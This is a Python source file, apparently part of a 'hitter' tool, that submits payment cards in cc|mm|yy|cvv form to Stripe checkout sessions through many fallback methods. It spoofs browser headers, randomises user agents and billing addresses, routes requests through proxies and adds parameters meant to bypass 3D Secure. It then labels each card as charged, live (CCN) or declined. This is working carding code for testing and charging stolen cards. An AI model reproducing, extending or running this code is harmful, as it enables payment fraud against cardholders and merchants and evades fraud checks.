# -*- coding: utf-8 -*-
"""Stripe charge with session-based approach + bypass techniques from
DeepBypasser and Dot Bypasser.
Methods: direct pages, direct PI, token, PM, setup_intent
Fallbacks: JS origin headers, Macau billing, browser-based charge

Fixes:
- checkout_amount_mismatch: re-init + retry with fresh invoice amounts
- False 3DS: better detection, higher cache threshold, prefer PI methods
"""
import time
import asyncio
import re
import aiohttp

from billing_data import (
    random_full_name, random_email, random_address,
    random_user_agent, random_timezone, random_locale,
    build_stripe_headers, build_stripe_headers_js,
    random_billing_for_country,
)

from hitter.browser_charge import browser_charge_card, close_browser

_session = None
_site_method_cache: dict[str, str] = {}
_checkout_cookies_cache: dict[str, dict] = {}
_site_3ds_cache: dict[str, int] = {}

_3DS_CACHE_THRESHOLD = 5

LIVE_DECLINE_CODES = frozenset({
    "incorrect_cvc", "incorrect_zip", "insufficient_funds",
    "authentication_required", "card_velocity_exceeded",
})

DEAD_DECLINE_CODES = frozenset({
    "stolen_card", "lost_card", "fraudulent", "pickup_card",
    "restricted_card", "security_violation", "card_not_supported",
    "invalid_account", "new_account_information_available",
    "do_not_honor", "do_not_try_again", "invalid_amount",
    "currency_not_supported", "testmode_decline",
})

AMOUNT_MISMATCH_KEYWORDS = frozenset({
    "amount_mismatch", "checkout_amount_mismatch",
    "computed invoice amount", "does not match",
})

SESSION_DEAD_KEYWORDS = frozenset({
    "checkout_not_active_session", "not_active_session",
    "no longer active", "session is no longer",
    "payment_intent_unexpected_state",
    "session_expired", "checkout session has expired",
})


async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None


def _is_surface_error(data: dict) -> bool:
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    code = (data["error"].get("code") or "").lower()
    return (
        "integration surface" in msg
        or "unsupported for publishable key" in msg
        or "cannot perform this action" in msg
        or "created by checkout" in msg
        or "not allowed for checkout session" in msg
        or code == "resource_missing"
        or code == "parameter_unknown"
    )


def _is_amount_mismatch(data: dict) -> bool:
    """Detect checkout_amount_mismatch errors."""
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    code = (data["error"].get("code") or "").lower()
    combined = f"{code} {msg}"
    return any(kw in combined for kw in AMOUNT_MISMATCH_KEYWORDS)


def _is_session_dead(data: dict) -> bool:
    """Detect dead/expired/canceled checkout session errors."""
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    code = (data["error"].get("code") or "").lower()
    combined = f"{code} {msg}"
    return any(kw in combined for kw in SESSION_DEAD_KEYWORDS)


def _extract_pi_info(init_data: dict) -> tuple[str, str]:
    pi = init_data.get("payment_intent") or {}
    client_secret = pi.get("client_secret", "")
    pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
    return pi_id, client_secret


def _extract_si_info(init_data: dict) -> tuple[str, str]:
    """Extract setup_intent info if present."""
    si = init_data.get("setup_intent") or {}
    client_secret = si.get("client_secret", "")
    si_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
    return si_id, client_secret


def _get_amounts(init_data: dict) -> tuple[int, int]:
    """Get amounts, preferring invoice for subscriptions to avoid mismatch."""
    inv = init_data.get("invoice")
    lig = init_data.get("line_item_group")

    if inv and inv.get("total") is not None:
        return inv.get("total", 0), inv.get("subtotal", inv.get("total", 0))

    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)

    pi = init_data.get("payment_intent") or {}
    amt = pi.get("amount", 0)
    return amt, amt


def _get_billing(init_data: dict, country: str = "US") -> dict:
    cust = init_data.get("customer") or {}
    addr = cust.get("address") or {}
    billing = random_billing_for_country(country)
    return {
        "name": cust.get("name") or billing["name"],
        "email": init_data.get("customer_email") or random_email(),
        "country": addr.get("country") or billing["country"],
        "line1": addr.get("line1") or billing["line1"],
        "city": addr.get("city") or billing["city"],
        "state": addr.get("state") or billing["state"],
        "postal_code": addr.get("postal_code") or billing["postal_code"],
    }


def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
    """Parse confirm response with comprehensive decline code handling."""
    if _is_surface_error(conf):
        return None

    if _is_amount_mismatch(conf):
        return None

    if _is_session_dead(conf):
        msg = conf["error"].get("message", "Session dead")
        code = conf["error"].get("code", "")
        return "SESSION_DEAD", f"{code}: {msg}" if code else msg

    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        code = err.get("code", "")
        msg = err.get("message", "Failed")
        if dc in LIVE_DECLINE_CODES:
            return "CCN", f"{dc.upper()}: {msg}"
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else (f"{code}: {msg}" if code else msg)

    pi = conf.get("payment_intent") or conf.get("setup_intent") or {}
    st = pi.get("status", "") or conf.get("status", "")

    if st == "succeeded":
        return "CHARGED", "Charged"

    if st == "requires_action":
        na = pi.get("next_action") or {}
        na_type = na.get("type", "")

        if na_type == "redirect_to_url":
            redirect_url = (na.get("redirect_to_url", {}).get("url", "") or "").lower()
            if any(kw in redirect_url for kw in (
                "captcha", "recaptcha", "hcaptcha", "challenge",
                "verify", "turnstile",
            )):
                return "DECLINED", "Captcha/Verification required"
            return "3DS", "3DS Required"

        if na_type == "use_stripe_sdk":
            sdk_data = na.get("use_stripe_sdk", {})
            sdk_type = (sdk_data.get("type", "") or "").lower()
            if "three_d_secure" in sdk_type:
                return "3DS", "3DS Required"
            if sdk_type:
                return "3DS", f"Verification: {sdk_type}"
            return "3DS", "3DS Required"

        return "3DS", "3DS Required"

    if st == "requires_payment_method":
        lpe = pi.get("last_payment_error") or pi.get("last_setup_error") or {}
        dc = lpe.get("decline_code", "")
        msg = lpe.get("message", "Declined")
        if dc in LIVE_DECLINE_CODES:
            return "CCN", f"{dc.upper()}: {msg}"
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg

    charge = conf.get("charge") or {}
    charges = conf.get("charges", {})
    outcome = None
    if isinstance(charge, dict) and "outcome" in charge:
        outcome = charge["outcome"]
    if isinstance(charges, dict):
        ch_data = charges.get("data", [])
        if isinstance(ch_data, list) and ch_data:
            c0 = ch_data[0]
            if isinstance(c0, dict) and "outcome" in c0:
                outcome = c0["outcome"]

    if outcome and isinstance(outcome, dict):
        net_dc = outcome.get("network_decline_code", "")
        reason = outcome.get("reason", "")
        seller_msg = outcome.get("seller_message", "")

        if reason in LIVE_DECLINE_CODES:
            return "CCN", f"{reason}: {seller_msg or net_dc}"
        if seller_msg:
            return "DECLINED", seller_msg
        if reason:
            return "DECLINED", f"{reason}: {net_dc}" if net_dc else reason

    return "UNKNOWN", st or "Unknown"


def _billing_params(prefix: str, b: dict) -> str:
    return (
        f"&{prefix}[name]={b['name']}"
        f"&{prefix}[email]={b['email']}"
        f"&{prefix}[address][country]={b['country']}"
        f"&{prefix}[address][line1]={b['line1']}"
        f"&{prefix}[address][city]={b['city']}"
        f"&{prefix}[address][postal_code]={b['postal_code']}"
        f"&{prefix}[address][state]={b['state']}"
    )


def _card_pm_data(card: dict) -> str:
    return (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][number]={card['cc']}"
        f"&payment_method_data[card][exp_month]={card['mm']}"
        f"&payment_method_data[card][exp_year]={card['yy']}"
        f"&payment_method_data[card][cvc]={card['cvv']}"
    )


def _anti_3ds_params() -> str:
    """Anti-3DS parameters inspired by DeepBypasser's request interception."""
    return (
        "&payment_method_options[card][request_three_d_secure]=any"
        "&mandate_data[customer_acceptance][type]=online"
        "&mandate_data[customer_acceptance][online][ip_address]=8.8.8.8"
        "&radar_options[session]="
    )


async def _fetch_checkout_cookies(checkout_url: str, proxy_url: str | None = None) -> dict:
    cs_match = re.search(r"cs_(live|test)_[A-Za-z0-9]+", checkout_url)
    cache_key = cs_match.group(0) if cs_match else checkout_url
    if cache_key in _checkout_cookies_cache:
        return _checkout_cookies_cache[cache_key]

    cookies = {}
    try:
        ua = random_user_agent()
        page_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": ua,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
        }
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(
                checkout_url, headers=page_headers, proxy=proxy_url,
                allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                for k, v in r.cookies.items():
                    cookies[k] = v.value
                await r.read()
    except Exception:
        pass

    _checkout_cookies_cache[cache_key] = cookies
    return cookies


async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url, country="US"):
    b = _get_billing(init_data, country)
    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")

    body = (
        f"eid=NA&{_card_pm_data(card)}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    if _is_amount_mismatch(conf):
        return None

    return _parse_confirm_response(conf)


async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url, country="US"):
    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    b = _get_billing(init_data, country)
    body = (
        f"{_card_pm_data(card)}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
        f"{_anti_3ds_params()}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_token_pi(s, card, pk, init_data, headers, proxy_url, country="US"):
    token_body = (
        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/tokens",
        headers=headers, data=token_body, proxy=proxy_url,
    ) as r:
        tok = await r.json()

    if _is_surface_error(tok):
        return None
    if "error" in tok:
        dc = tok["error"].get("decline_code", "")
        code = tok["error"].get("code", "")
        msg = tok["error"].get("message", "Token error")[:80]
        if dc in LIVE_DECLINE_CODES:
            return "CCN", f"{dc.upper()}: {msg}"
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else (f"{code}: {msg}" if code else msg)
    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    b = _get_billing(init_data, country)
    confirm_body = (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
        f"{_anti_3ds_params()}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=confirm_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url, country="US"):
    b = _get_billing(init_data, country)
    pm_body = (
        f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"{_billing_params('billing_details', b)}&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers, data=pm_body, proxy=proxy_url,
    ) as r:
        pm = await r.json()

    if _is_surface_error(pm):
        return None
    if "error" in pm:
        dc = pm["error"].get("decline_code", "")
        msg = pm["error"].get("message", "Card error")[:80]
        if dc in LIVE_DECLINE_CODES:
            return "CCN", f"{dc.upper()}: {msg}"
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
    pm_id = pm.get("id")
    if not pm_id:
        return "FAILED", "No PM"

    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    conf_body = (
        f"eid=NA&payment_method={pm_id}&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    if _is_amount_mismatch(conf):
        return None

    return _parse_confirm_response(conf)


async def _method_setup_intent(s, card, pk, init_data, headers, proxy_url, country="US"):
    """Try confirming via SetupIntent if present."""
    si_id, client_secret = _extract_si_info(init_data)
    if not si_id or not client_secret:
        return None

    b = _get_billing(init_data, country)
    body = (
        f"{_card_pm_data(card)}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
        f"{_anti_3ds_params()}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm",
        headers=headers, data=body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict,
    checkout_url: str = "",
    proxy_url: str | None = None,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    cached = _site_method_cache.get(cs)

    if _site_3ds_cache.get(cs, 0) >= _3DS_CACHE_THRESHOLD:
        result["status"] = "3DS"
        result["response"] = "3DS Required (site cached)"
        result["time"] = 0
        return result

    if cached == "BROWSER" and checkout_url:
        br = await browser_charge_card(card, checkout_url, proxy_url)
        if br.get("status") == "3DS":
            _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
        return br

    if checkout_url:
        await _fetch_checkout_cookies(checkout_url, proxy_url)

    for attempt in range(max_retries + 1):
        try:
            ua = random_user_agent()
            h_checkout = build_stripe_headers(ua, origin="https://checkout.stripe.com")
            h_js = build_stripe_headers_js(ua)

            cookies = _checkout_cookies_cache.get(cs, {})
            if cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                h_checkout["cookie"] = cookie_str
                h_js["cookie"] = cookie_str

            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=25, connect=8),
            ) as s:
                billing_countries = ["US", "MO"]

                # Prefer PI-based methods (support anti-3DS, no expected_amount)
                all_methods = [
                    ("DI", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
                    ("DI_JS", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_js, proxy_url, c)),
                    ("TK", lambda c="US": _method_token_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
                    ("TK_JS", lambda c="US": _method_token_pi(s, card, pk, init_data, h_js, proxy_url, c)),
                    ("DP", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
                    ("DP_JS", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url, c)),
                    ("PM", lambda c="US": _method_pm_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
                    ("SI", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_checkout, proxy_url, c)),
                    ("SI_JS", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_js, proxy_url, c)),
                ]

                if cached and cached != "BROWSER":
                    ordered = [m for m in all_methods if m[0] == cached]
                    ordered += [m for m in all_methods if m[0] != cached]
                else:
                    ordered = all_methods

                res = None
                amount_mismatch_seen = False

                for method_name, method_fn in ordered:
                    for country in billing_countries:
                        try:
                            res = await method_fn(country)
                        except Exception:
                            res = None
                        if res is not None:
                            _site_method_cache[cs] = method_name
                            break
                    if res is not None:
                        break

                # Re-init + retry once if all page-based methods returned None
                # due to amount_mismatch and no PI method worked
                if res is None and not amount_mismatch_seen:
                    try:
                        from hitter.checkout_parse import re_init_checkout
                        fresh = await re_init_checkout(pk, cs, proxy_url)
                        if fresh:
                            init_data_retry = fresh
                            retry_methods = [
                                ("DP_R", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data_retry, h_checkout, proxy_url, c)),
                                ("PM_R", lambda c="US": _method_pm_pages(s, card, pk, cs, init_data_retry, h_checkout, proxy_url, c)),
                            ]
                            for method_name, method_fn in retry_methods:
                                for country in billing_countries:
                                    try:
                                        res = await method_fn(country)
                                    except Exception:
                                        res = None
                                    if res is not None:
                                        _site_method_cache[cs] = method_name.replace("_R", "")
                                        break
                                if res is not None:
                                    break
                    except Exception:
                        pass

                if res is None and checkout_url:
                    br = await browser_charge_card(card, checkout_url, proxy_url)
                    result.update(br)
                    if br["status"] not in (None, "ERROR"):
                        _site_method_cache[cs] = "BROWSER"
                    if br.get("status") == "3DS":
                        _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
                    return result

                if res is None:
                    result["status"] = "FAILED"
                    result["response"] = "All methods unsupported"
                else:
                    result["status"], result["response"] = res
                    if result["status"] == "3DS":
                        _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
                    elif result["status"] in ("CHARGED", "CCN"):
                        _site_3ds_cache.pop(cs, None)

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e).lower()
            retryable = any(kw in err_str for kw in ("disconnect", "timeout", "connection", "reset"))
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result


async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    checkout_url = checkout_data.get("url", "")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, checkout_url, proxy_url)
